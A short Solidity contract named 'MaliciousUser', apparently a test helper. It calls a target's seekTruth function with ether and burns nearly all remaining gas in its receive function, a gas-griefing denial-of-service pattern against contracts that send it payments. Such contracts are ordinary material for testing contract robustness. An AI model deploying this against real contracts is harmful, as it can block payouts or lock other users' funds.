// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISeeker {
    function seekTruth(string memory wish) external payable;
}

contract MaliciousUser {
    bool public consumeGas = true;

    function attack(address seeker) external payable {
        ISeeker(seeker).seekTruth{value: msg.value}("attack");
    }

    receive() external payable {
        if (consumeGas) {
            // Burn gas until near OOG
            // Dynamic loop
            uint256 i = 0;
            while (gasleft() > 10000) {
                i++;
            }
        }
    }
}
